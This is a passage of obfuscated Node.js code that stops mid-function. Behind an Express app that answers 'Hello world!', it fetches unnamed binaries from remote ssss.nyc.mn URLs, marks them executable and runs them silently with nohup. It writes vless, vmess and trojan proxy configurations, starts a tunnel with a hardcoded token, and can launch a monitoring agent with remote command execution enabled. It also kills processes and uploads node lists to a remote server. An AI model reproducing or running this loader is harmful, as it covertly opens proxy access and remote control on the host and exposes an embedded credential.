const _0x439737=_0x2075;(function(_0x56caa4,_0x199a42){const _0x3bf1c7={_0x6acb3f:0x169,_0x3911f7:0x1eb,_0x410c6e:0x190},_0x274b1a=_0x2075,_0x272475=_0x56caa4();while(!![]){try{const _0x3cb10b=-parseInt(_0x274b1a(0x1c4))/0x1+parseInt(_0x274b1a(_0x3bf1c7._0x6acb3f))/0x2+-parseInt(_0x274b1a(0x19f))/0x3+parseInt(_0x274b1a(0x18a))/0x4+-parseInt(_0x274b1a(0x170))/0x5*(-parseInt(_0x274b1a(_0x3bf1c7._0x3911f7))/0x6)+-parseInt(_0x274b1a(0x142))/0x7+parseInt(_0x274b1a(_0x3bf1c7._0x410c6e))/0x8;if(_0x3cb10b===_0x199a42)break;else _0x272475['push'](_0x272475['shift']());}catch(_0x2fda55){_0x272475['push'](_0x272475['shift']());}}}(_0x13cc,0x1d401));const express=require(_0x439737(0x166)),app=express(),axios=require(_0x439737(0x192)),os=require('os'),fs=require('fs'),path=require(_0x439737(0x149)),{promisify}=require(_0x439737(0x1ac)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x439737(0x1dd)),UPLOAD_URL=process[_0x439737(0x1d7)][_0x439737(0x136)]||'',PROJECT_URL=process[_0x439737(0x1d7)][_0x439737(0x1b9)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x439737(0x1d7)][_0x439737(0x1a2)]||_0x439737(0x1de),SUB_PATH=process[_0x439737(0x1d7)][_0x439737(0x1b8)]||_0x439737(0x1ce),PORT=process[_0x439737(0x1d7)][_0x439737(0x154)]||process[_0x439737(0x1d7)][_0x439737(0x1be)]||0xbb8,UUID=process[_0x439737(0x1d7)]['UUID']||'2829b945-d2f5-43a6-8e78-8e75a786089a',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x439737(0x1d7)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x439737(0x1d7)][_0x439737(0x16c)]||'',ARGO_DOMAIN=process[_0x439737(0x1d7)]['ARGO_DOMAIN']||'kiss.cody.eu.org',ARGO_AUTH=process[_0x439737(0x1d7)][_0x439737(0x1cf)]||_0x439737(0x1a3),ARGO_PORT=process[_0x439737(0x1d7)][_0x439737(0x172)]||0x1f41,CFIP=process[_0x439737(0x1d7)]['CFIP']||_0x439737(0x1e7),CFPORT=process[_0x439737(0x1d7)]['CFPORT']||0x1bb,NAME=process[_0x439737(0x1d7)][_0x439737(0x19b)]||'';function _0x13cc(){const _0x2b7f43=['application/json','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA\x20variable\x20is\x20empty,skip\x20running','quic','forEach','substring','org','match','rm\x20-rf\x20','\x20failed:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','13572cyuQgp','/api/add-nodes','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','config.json','\x0a\x20\x20\x20\x20','2195456hLNIaj','existsSync','axios','base64','clear','--tls','list.txt','error','Error\x20downloading\x20files:','2053','2087','NAME','\x20-c\x20\x22','stream','https://amd64.ssss.nyc.mn/agent','459678yogrtl','sub.txt','message','FILE_PATH','eyJhIjoiOWRlZDFiM2EyYmQzN2VkZjgzOWE4MjQwMmQwMWJmMmMiLCJ0IjoiMDUxY2RiNGQtYjJlMy00ZGUxLWIzZmEtODFmMTcwNmMzMDMwIiwicyI6IlpEYzBaalUxTkdZdE1ERTFZaTAwWldRekxXSmtObVl0WXpsaU0yTTRNamRoTUdVNCJ9','unlinkSync','https://amd64.ssss.nyc.mn/v1','success','get','\x20>\x20nul\x202>&1','ARGO_DOMAIN:','\x20successfully','https://arm64.ssss.nyc.mn/agent','util','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vmess-argo?ed=2560','https://oooo.serv00.net/add-url','country_code','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','length','xtls-rprx-vision','http://ip-api.com/json/','/vless-argo','none','\x20already\x20exists','SUB_PATH','PROJECT_URL','firefox','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','PORT','https+local://8.8.8.8/dns-query','arch','App\x20is\x20running','stringify','text/plain;\x20charset=utf-8','205391fttXLV','writeFileSync','\x20-p\x20','unlink','?security=tls&sni=','\x22\x20>\x20/dev/null\x202>&1','mkdirSync','status','/dev/null','http\x20server\x20is\x20running\x20on\x20port:','kiss','ARGO_AUTH','127.0.0.1','send','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','basename','2096','unshift','8443','env','utf-8','abcdefghijklmnopqrstuvwxyz','\x0a\x0avmess://','statSync','countryCode','child_process','./tmp','Empowerment\x20success\x20for\x20','join','includes','chmod','Download\x20','split','vless','https://arm64.ssss.nyc.mn/v1','cdns.doon.eu.org','readdirSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Content-Type','472806eHjryj','del\x20/f\x20/q\x20','post','true','Nodes\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','finish','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','UPLOAD_URL','block','charAt','pipe','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel.json','https://arm64.ssss.nyc.mn/bot','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','set','Subscription\x20uploaded\x20successfully','&fp=firefox&type=ws&host=','443','1109829vyuuaB','nohup\x20','Error\x20executing\x20command:\x20','npm\x20running\x20error:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tls','win32','path','\x20>/dev/null\x202>&1','taskkill\x20/f\x20/im\x20','tunnel.yml','freedom','\x20-c\x20','log','readFileSync','\x0a\x0atrojan://','catch','https://ipapi.co/json/','SERVER_PORT','2083','/vmess-argo','\x20>/dev/null\x202>&1\x20&','php\x20running\x20error:\x20','response','pkill\x20-f\x20\x22[','/trojan-argo','blackhole','arm','/config.json\x20>/dev/null\x202>&1\x20&','data','amd','Unknown','Skipping\x20adding\x20automatic\x20access\x20task','from','https://amd64.ssss.nyc.mn/web','listen','express','toString','createWriteStream','245490uXwxoN','all','tcp','NEZHA_KEY','filter','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/add-subscriptions','15pXabbk','config.yaml','ARGO_PORT','trojan','automatic\x20access\x20task\x20added\x20successfully','?encryption=none&security=tls&sni=','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain:','push','\x20is\x20running','pop','web\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http','https://amd64.ssss.nyc.mn/bot'];_0x13cc=function(){return _0x2b7f43;};return _0x13cc();}!fs[_0x439737(0x191)](FILE_PATH)?(fs[_0x439737(0x1ca)](FILE_PATH),console[_0x439737(0x14f)](FILE_PATH+'\x20is\x20created')):console[_0x439737(0x14f)](FILE_PATH+_0x439737(0x1b7));function generateRandomName(){const _0x2ce1a3={_0x1fbeac:0x1d9,_0x567973:0x138},_0x298cc9=_0x439737,_0x3b8d01=_0x298cc9(_0x2ce1a3._0x1fbeac);let _0x17b2e1='';for(let _0x2ae418=0x0;_0x2ae418<0x6;_0x2ae418++){_0x17b2e1+=_0x3b8d01[_0x298cc9(_0x2ce1a3._0x567973)](Math['floor'](Math['random']()*_0x3b8d01['length']));}return _0x17b2e1;}function _0x2075(_0x3d64ec,_0xab79b7){const _0x13cc3c=_0x13cc();return _0x2075=function(_0x2075c5,_0x52e803){_0x2075c5=_0x2075c5-0x135;let _0x1880a1=_0x13cc3c[_0x2075c5];return _0x1880a1;},_0x2075(_0x3d64ec,_0xab79b7);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x439737(0x1e0)](FILE_PATH,npmName),phpPath=path[_0x439737(0x1e0)](FILE_PATH,phpName),webPath=path[_0x439737(0x1e0)](FILE_PATH,webName),botPath=path[_0x439737(0x1e0)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x439737(0x1a0)),listPath=path[_0x439737(0x1e0)](FILE_PATH,_0x439737(0x196)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x439737(0x1e0)](FILE_PATH,_0x439737(0x18e));function deleteNodes(){const _0x408359={_0x19feed:0x150,_0x270b47:0x1d8,_0x406993:0x163,_0x3bf482:0x167,_0x401d35:0x16d,_0x4b2f76:0x1b2,_0x4d8733:0x17f,_0x243e60:0x152},_0x9d5351=_0x439737;try{if(!UPLOAD_URL)return;if(!fs[_0x9d5351(0x191)](subPath))return;let _0x6befd;try{_0x6befd=fs[_0x9d5351(_0x408359._0x19feed)](subPath,_0x9d5351(_0x408359._0x270b47));}catch{return null;}const _0x309c8c=Buffer[_0x9d5351(_0x408359._0x406993)](_0x6befd,_0x9d5351(0x193))[_0x9d5351(_0x408359._0x3bf482)](_0x9d5351(0x1d8)),_0x241915=_0x309c8c[_0x9d5351(0x1e4)]('\x0a')[_0x9d5351(_0x408359._0x401d35)](_0x1722cb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1722cb));if(_0x241915[_0x9d5351(_0x408359._0x4b2f76)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x9d5351(0x1c2)]({'nodes':_0x241915}),{'headers':{'Content-Type':_0x9d5351(_0x408359._0x4d8733)}})[_0x9d5351(_0x408359._0x243e60)](_0x4d0819=>{return null;}),null;}catch(_0x21d5cc){return null;}}function cleanupOldFiles(){const _0x58a628={_0x497939:0x1e8},_0x288012=_0x439737;try{const _0x5d3886=fs[_0x288012(_0x58a628._0x497939)](FILE_PATH);_0x5d3886[_0x288012(0x183)](_0xa0ca7e=>{const _0x3172d7=_0x288012,_0x5da702=path['join'](FILE_PATH,_0xa0ca7e);try{const _0xec5dd8=fs[_0x3172d7(0x1db)](_0x5da702);_0xec5dd8['isFile']()&&fs['unlinkSync'](_0x5da702);}catch(_0x6d168d){}});}catch(_0x44bce8){}}app[_0x439737(0x1a7)]('/',function(_0x50c0f6,_0x2d7034){const _0x3e0bfb={_0x11c5d3:0x1d1},_0x51f74c=_0x439737;_0x2d7034[_0x51f74c(_0x3e0bfb._0x11c5d3)]('Hello\x20world!');});async function generateConfig(){const _0x21c3fc={_0xaa0d6f:0x1cc,_0xf9a15f:0x1b5,_0x26e5f3:0x15b,_0x56c1f2:0x1b5,_0x452556:0x1d0,_0x5e278f:0x156,_0x369202:0x17d,_0x488feb:0x173,_0x488333:0x17d,_0x423ae8:0x147,_0x11486b:0x182,_0x32d58b:0x1bf,_0x40f932:0x15c,_0x43d3e8:0x1e0,_0x8b504f:0x1c2},_0x38b757=_0x439737,_0x5439c5={'log':{'access':_0x38b757(_0x21c3fc._0xaa0d6f),'error':_0x38b757(0x1cc),'loglevel':_0x38b757(0x1b6)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x38b757(0x1b3)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x38b757(_0x21c3fc._0xf9a15f),'dest':0xbba},{'path':_0x38b757(0x156),'dest':0xbbb},{'path':_0x38b757(_0x21c3fc._0x26e5f3),'dest':0xbbc}]},'streamSettings':{'network':_0x38b757(0x16b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x38b757(0x1e5),'settings':{'clients':[{'id':UUID}],'decryption':_0x38b757(0x1b6)},'streamSettings':{'network':_0x38b757(0x16b),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x38b757(0x1b6)},'streamSettings':{'network':'ws','security':_0x38b757(0x1b6),'wsSettings':{'path':_0x38b757(_0x21c3fc._0x56c1f2)}},'sniffing':{'enabled':!![],'destOverride':[_0x38b757(0x17d),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x38b757(_0x21c3fc._0x452556),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x38b757(_0x21c3fc._0x5e278f)}},'sniffing':{'enabled':!![],'destOverride':[_0x38b757(_0x21c3fc._0x369202),'tls',_0x38b757(0x182)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x38b757(_0x21c3fc._0x488feb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x38b757(0x1b6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x38b757(_0x21c3fc._0x488333),_0x38b757(_0x21c3fc._0x423ae8),_0x38b757(_0x21c3fc._0x11486b)],'metadataOnly':![]}}],'dns':{'servers':[_0x38b757(_0x21c3fc._0x32d58b)]},'outbounds':[{'protocol':_0x38b757(0x14d),'tag':'direct'},{'protocol':_0x38b757(_0x21c3fc._0x40f932),'tag':_0x38b757(0x137)}]};fs[_0x38b757(0x1c5)](path[_0x38b757(_0x21c3fc._0x43d3e8)](FILE_PATH,'config.json'),JSON[_0x38b757(_0x21c3fc._0x8b504f)](_0x5439c5,null,0x2));}function getSystemArchitecture(){const _0x4ade7d={_0x6e421b:0x15d,_0x495226:0x15d,_0xb23882:0x160},_0xd9978d=_0x439737,_0x44c530=os[_0xd9978d(0x1c0)]();return _0x44c530===_0xd9978d(_0x4ade7d._0x6e421b)||_0x44c530==='arm64'||_0x44c530==='aarch64'?_0xd9978d(_0x4ade7d._0x495226):_0xd9978d(_0x4ade7d._0xb23882);}function downloadFile(_0x51359d,_0x1f81b4,_0x3d04bb){const _0x54d2c8={_0x530bb0:0x168},_0x525815={_0x371787:0x1e3,_0x4c12da:0x1d3,_0x4fd2e5:0x1a1},_0xb22bff={_0x178009:0x139},_0x43c7b4={_0x340a4b:0x14f},_0x1c8088=_0x439737,_0xa8bd63=_0x51359d;!fs[_0x1c8088(0x191)](FILE_PATH)&&fs[_0x1c8088(0x1ca)](FILE_PATH,{'recursive':!![]});const _0xe8fa04=fs[_0x1c8088(_0x54d2c8._0x530bb0)](_0xa8bd63);axios({'method':_0x1c8088(0x1a7),'url':_0x1f81b4,'responseType':_0x1c8088(0x19d)})['then'](_0x194693=>{const _0x25aa68={_0x53c0d4:0x1c7,_0x433351:0x1e3,_0xf78a22:0x188},_0xf1c5ec=_0x1c8088;_0x194693['data'][_0xf1c5ec(_0xb22bff._0x178009)](_0xe8fa04),_0xe8fa04['on'](_0xf1c5ec(0x1f1),()=>{const _0x5741eb=_0xf1c5ec;_0xe8fa04['close'](),console[_0x5741eb(_0x43c7b4._0x340a4b)](_0x5741eb(0x1e3)+path['basename'](_0xa8bd63)+_0x5741eb(0x1aa)),_0x3d04bb(null,_0xa8bd63);}),_0xe8fa04['on']('error',_0x4445b3=>{const _0x375f6b=_0xf1c5ec;fs[_0x375f6b(_0x25aa68._0x53c0d4)](_0xa8bd63,()=>{});const _0x574e5e=_0x375f6b(_0x25aa68._0x433351)+path['basename'](_0xa8bd63)+_0x375f6b(_0x25aa68._0xf78a22)+_0x4445b3['message'];console['error'](_0x574e5e),_0x3d04bb(_0x574e5e);});})['catch'](_0x4ae4ae=>{const _0x1b3b56=_0x1c8088,_0x215ba0=_0x1b3b56(_0x525815._0x371787)+path[_0x1b3b56(_0x525815._0x4c12da)](_0xa8bd63)+_0x1b3b56(0x188)+_0x4ae4ae[_0x1b3b56(_0x525815._0x4fd2e5)];console['error'](_0x215ba0),_0x3d04bb(_0x215ba0);});}async function downloadFilesAndRun(){const _0x36019e={_0x6ed7df:0x1b2,_0x466d37:0x13d,_0x2a50a9:0x16a,_0x523435:0x197,_0x4797be:0x1e4,_0x2b29c6:0x1d6,_0x59fa7f:0x19a,_0x175111:0x155,_0x9932c1:0x199,_0x33bb9a:0x1bc,_0x36a690:0x146,_0x3bd402:0x1bd,_0x526d81:0x171,_0x3ad6ee:0x19c,_0x58ae00:0x1d2,_0x5db5a4:0x14f,_0xc5c059:0x141,_0x452a82:0x1d4,_0xcfe6e7:0x199,_0x51589e:0x195,_0x37360d:0x1c6,_0x8399b6:0x179,_0x11db69:0x197,_0x53e608:0x14e,_0x1aa503:0x15e,_0xa4426d:0x1f0,_0x3810b2:0x157,_0x1f460a:0x144},_0x21ba36={_0x40a36e:0x183},_0x5d59e7=_0x439737,_0x6b9f1a=getSystemArchitecture(),_0x302674=getFilesForArchitecture(_0x6b9f1a);if(_0x302674[_0x5d59e7(_0x36019e._0x6ed7df)]===0x0){console[_0x5d59e7(0x14f)](_0x5d59e7(_0x36019e._0x466d37));return;}const _0x5ba681=_0x302674['map'](_0x4b836d=>{return new Promise((_0x3e0bc6,_0x58d6f3)=>{downloadFile(_0x4b836d['fileName'],_0x4b836d['fileUrl'],(_0x15ab68,_0xf5890b)=>{_0x15ab68?_0x58d6f3(_0x15ab68):_0x3e0bc6(_0xf5890b);});});});try{await Promise[_0x5d59e7(_0x36019e._0x2a50a9)](_0x5ba681);}catch(_0x59ef43){console[_0x5d59e7(_0x36019e._0x523435)](_0x5d59e7(0x198),_0x59ef43);return;}function _0x30cd1c(_0x3db16f){const _0x2578ff={_0x5b8ed5:0x191},_0x2a4bc0={_0x3c461c:0x14f,_0x2217c7:0x1df},_0x491084=_0x5d59e7,_0x49093b=0x1fd;_0x3db16f[_0x491084(_0x21ba36._0x40a36e)](_0x1fb8c8=>{const _0x225640=_0x491084;fs[_0x225640(_0x2578ff._0x5b8ed5)](_0x1fb8c8)&&fs[_0x225640(0x1e2)](_0x1fb8c8,_0x49093b,_0x5888ca=>{const _0xf67da2=_0x225640;_0x5888ca?console['error']('Empowerment\x20failed\x20for\x20'+_0x1fb8c8+':\x20'+_0x5888ca):console[_0xf67da2(_0x2a4bc0._0x3c461c)](_0xf67da2(_0x2a4bc0._0x2217c7)+_0x1fb8c8+':\x20'+_0x49093b['toString'](0x8));});});}const _0x4834b7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x30cd1c(_0x4834b7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x320064=NEZHA_SERVER[_0x5d59e7(0x1e1)](':')?NEZHA_SERVER[_0x5d59e7(_0x36019e._0x4797be)](':')[_0x5d59e7(0x17a)]():'',_0x57ae04=new Set([_0x5d59e7(0x141),_0x5d59e7(_0x36019e._0x2b29c6),_0x5d59e7(0x1d4),_0x5d59e7(_0x36019e._0x59fa7f),_0x5d59e7(_0x36019e._0x175111),_0x5d59e7(_0x36019e._0x9932c1)]),_0xa4e581=_0x57ae04['has'](_0x320064)?_0x5d59e7(0x1ee):'false',_0x2c0bec=_0x5d59e7(_0x36019e._0x33bb9a)+NEZHA_KEY+_0x5d59e7(_0x36019e._0x36a690)+NEZHA_SERVER+_0x5d59e7(_0x36019e._0x3bd402)+_0xa4e581+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x5d59e7(0x1e0)](FILE_PATH,_0x5d59e7(_0x36019e._0x526d81)),_0x2c0bec);const _0x207090='nohup\x20'+phpPath+_0x5d59e7(_0x36019e._0x3ad6ee)+FILE_PATH+_0x5d59e7(_0x36019e._0x58ae00);try{await exec(_0x207090),console[_0x5d59e7(_0x36019e._0x5db5a4)](phpName+'\x20is\x20running'),await new Promise(_0x25d363=>setTimeout(_0x25d363,0x3e8));}catch(_0x36eb5b){console[_0x5d59e7(0x197)](_0x5d59e7(0x158)+_0x36eb5b);}}else{let _0x12c0f8='';const _0x41857f=[_0x5d59e7(_0x36019e._0xc5c059),_0x5d59e7(0x1d6),_0x5d59e7(_0x36019e._0x452a82),_0x5d59e7(_0x36019e._0x59fa7f),'2083',_0x5d59e7(_0x36019e._0xcfe6e7)];_0x41857f['includes'](NEZHA_PORT)&&(_0x12c0f8=_0x5d59e7(_0x36019e._0x51589e));const _0x5d7132='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5d59e7(_0x36019e._0x37360d)+NEZHA_KEY+'\x20'+_0x12c0f8+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5d7132),console[_0x5d59e7(0x14f)](npmName+_0x5d59e7(_0x36019e._0x8399b6)),await new Promise(_0x3e101d=>setTimeout(_0x3e101d,0x3e8));}catch(_0x235060){console[_0x5d59e7(_0x36019e._0x11db69)](_0x5d59e7(0x145)+_0x235060);}}}else console[_0x5d59e7(_0x36019e._0x5db5a4)](_0x5d59e7(0x181));const _0x4b5d5b='nohup\x20'+webPath+_0x5d59e7(_0x36019e._0x53e608)+FILE_PATH+_0x5d59e7(_0x36019e._0x1aa503);try{await exec(_0x4b5d5b),console['log'](webName+_0x5d59e7(0x179)),await new Promise(_0x42eb90=>setTimeout(_0x42eb90,0x3e8));}catch(_0x75e634){console[_0x5d59e7(0x197)](_0x5d59e7(0x17b)+_0x75e634);}if(fs['existsSync'](botPath)){let _0x16b249;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x16b249='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5d59e7(0x186)](/TunnelSecret/)?_0x16b249='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x16b249='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5d59e7(_0x36019e._0xa4426d)+ARGO_PORT;try{await exec(_0x5d59e7(0x143)+botPath+'\x20'+_0x16b249+_0x5d59e7(_0x36019e._0x3810b2)),console['log'](botName+_0x5d59e7(_0x36019e._0x8399b6)),await new Promise(_0x502027=>setTimeout(_0x502027,0x7d0));}catch(_0x1ae2cf){console[_0x5d59e7(0x197)](_0x5d59e7(_0x36019e._0x1f460a)+_0x1ae2cf);}}await new Promise(_0x4d903c=>setTimeout(_0x4d903c,0x1388));}function getFilesForArchitecture(_0x3b8a9c){const _0x20a0cc={_0x33d53e:0x18c,_0x142a41:0x164,_0x51b1ed:0x1ab,_0x400cb2:0x1e6,_0x277b53:0x1a5,_0x3590fd:0x1d5},_0x2ea727=_0x439737;let _0x11370c;_0x3b8a9c==='arm'?_0x11370c=[{'fileName':webPath,'fileUrl':_0x2ea727(_0x20a0cc._0x33d53e)},{'fileName':botPath,'fileUrl':_0x2ea727(0x13c)}]:_0x11370c=[{'fileName':webPath,'fileUrl':_0x2ea727(_0x20a0cc._0x142a41)},{'fileName':botPath,'fileUrl':_0x2ea727(0x17e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3fde67=_0x3b8a9c==='arm'?_0x2ea727(_0x20a0cc._0x51b1ed):_0x2ea727(0x19e);_0x11370c[_0x2ea727(0x1d5)]({'fileName':npmPath,'fileUrl':_0x3fde67});}else{const _0x494b9e=_0x3b8a9c===_0x2ea727(0x15d)?_0x2ea727(_0x20a0cc._0x400cb2):_0x2ea727(_0x20a0cc._0x277b53);_0x11370c[_0x2ea727(_0x20a0cc._0x3590fd)]({'fileName':phpPath,'fileUrl':_0x494b9e});}}return _0x11370c;}function argoType(){const _0x39e998={_0x47e5f3:0x1e0,_0x1eb7c0:0x18d,_0x30e2c6:0x1c5},_0x24381=_0x439737;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x24381(0x14f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x24381(0x1e1)]('TunnelSecret')){fs[_0x24381(0x1c5)](path[_0x24381(_0x39e998._0x47e5f3)](FILE_PATH,_0x24381(0x13b)),ARGO_AUTH);const _0x1f0cd2=_0x24381(_0x39e998._0x1eb7c0)+ARGO_AUTH[_0x24381(0x1e4)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x24381(_0x39e998._0x47e5f3)](FILE_PATH,_0x24381(0x13b))+_0x24381(0x17c)+ARGO_DOMAIN+_0x24381(0x135)+ARGO_PORT+_0x24381(0x1ad);fs[_0x24381(_0x39e998._0x30e2c6)](path[_0x24381(_0x39e998._0x47e5f3)](FILE_PATH,_0x24381(0x14c)),_0x1f0cd2);}else console['log'](_0x24381(0x189));}async function extractDomains(){const _0x506d93={_0x30665f:0x1e4,_0x4c40d3:0x183,_0x65ed0a:0x177,_0x239c14:0x180,_0x5bf254:0x1a4,_0x53fe21:0x1e0,_0x5d3640:0x1b1,_0x14066f:0x143,_0x25d0c1:0x157,_0x1a9efc:0x14f,_0x17b49f:0x144,_0x346967:0x197},_0x4b490b={_0x2e964b:0x1a7,_0x38d735:0x15f,_0x40ef1e:0x1b0,_0x248cc9:0x1a6,_0x25c883:0x185,_0x2fbbbf:0x161},_0x38e6ab={_0x20a684:0x14b,_0x4fe6a2:0x1c9},_0x4c3720={_0x548ce8:0x178},_0x3cd106=_0x439737;let _0x53c4c1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x53c4c1=ARGO_DOMAIN,console['log'](_0x3cd106(0x1a9),_0x53c4c1),await _0x10c177(_0x53c4c1);else try{const _0x214a8b=fs[_0x3cd106(0x150)](path['join'](FILE_PATH,'boot.log'),_0x3cd106(0x1d8)),_0x3040b5=_0x214a8b[_0x3cd106(_0x506d93._0x30665f)]('\x0a'),_0x5c2157=[];_0x3040b5[_0x3cd106(_0x506d93._0x4c40d3)](_0x2c17ab=>{const _0x914bbc=_0x3cd106,_0x452695=_0x2c17ab[_0x914bbc(0x186)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x452695){const _0x2c96af=_0x452695[0x1];_0x5c2157[_0x914bbc(_0x4c3720._0x548ce8)](_0x2c96af);}});if(_0x5c2157['length']>0x0)_0x53c4c1=_0x5c2157[0x0],console['log'](_0x3cd106(_0x506d93._0x65ed0a),_0x53c4c1),await _0x10c177(_0x53c4c1);else{console[_0x3cd106(0x14f)](_0x3cd106(_0x506d93._0x239c14)),fs[_0x3cd106(_0x506d93._0x5bf254)](path[_0x3cd106(_0x506d93._0x53fe21)](FILE_PATH,'boot.log'));async function _0x5852fe(){const _0x97329c=_0x3cd106;try{process['platform']===_0x97329c(0x148)?await exec(_0x97329c(_0x38e6ab._0x20a684)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x97329c(0x15a)+botName['charAt'](0x0)+']'+botName[_0x97329c(0x184)](0x1)+_0x97329c(_0x38e6ab._0x4fe6a2));}catch(_0x58adbc){}}_0x5852fe(),await new Promise(_0x4c53e1=>setTimeout(_0x4c53e1,0xbb8));const _0x1b13ee=_0x3cd106(_0x506d93._0x5d3640)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3cd106(_0x506d93._0x14066f)+botPath+'\x20'+_0x1b13ee+_0x3cd106(_0x506d93._0x25d0c1)),console[_0x3cd106(_0x506d93._0x1a9efc)](botName+_0x3cd106(0x179)),await new Promise(_0x5c7689=>setTimeout(_0x5c7689,0xbb8)),await extractDomains();}catch(_0x162b44){console[_0x3cd106(0x197)](_0x3cd106(_0x506d93._0x17b49f)+_0x162b44);}}}catch(_0x4b9e6a){console[_0x3cd106(_0x506d93._0x346967)]('Error\x20reading\x20boot.log:',_0x4b9e6a);}async function _0x396733(){const _0x32bc0b=_0x3cd106;try{const _0x3d1ba8=await axios[_0x32bc0b(_0x4b490b._0x2e964b)](_0x32bc0b(0x153),{'timeout':0xbb8});if(_0x3d1ba8[_0x32bc0b(_0x4b490b._0x38d735)]&&_0x3d1ba8[_0x32bc0b(0x15f)][_0x32bc0b(_0x4b490b._0x40ef1e)]&&_0x3d1ba8[_0x32bc0b(0x15f)][_0x32bc0b(0x185)])return _0x3d1ba8[_0x32bc0b(0x15f)]['country_code']+'_'+_0x3d1ba8['data'][_0x32bc0b(0x185)];}catch(_0x213011){try{const _0x1c891f=await axios['get'](_0x32bc0b(0x1b4),{'timeout':0xbb8});if(_0x1c891f[_0x32bc0b(0x15f)]&&_0x1c891f[_0x32bc0b(0x15f)][_0x32bc0b(0x1cb)]===_0x32bc0b(_0x4b490b._0x248cc9)&&_0x1c891f['data']['countryCode']&&_0x1c891f[_0x32bc0b(0x15f)][_0x32bc0b(_0x4b490b._0x25c883)])return _0x1c891f[_0x32bc0b(0x15f)][_0x32bc0b(0x1dc)]+'_'+_0x1c891f[_0x32bc0b(0x15f)][_0x32bc0b(0x185)];}catch(_0x2ec83d){}}return _0x32bc0b(_0x4b490b._0x2fbbbf);}async function _0x10c177(_0x1c0acd){const _0x4fa126=await _0x396733(),_0x421fb3=NAME?NAME+'-'+_0x4fa126:_0x4fa126;return new Promise(_0x1d447e=>{const 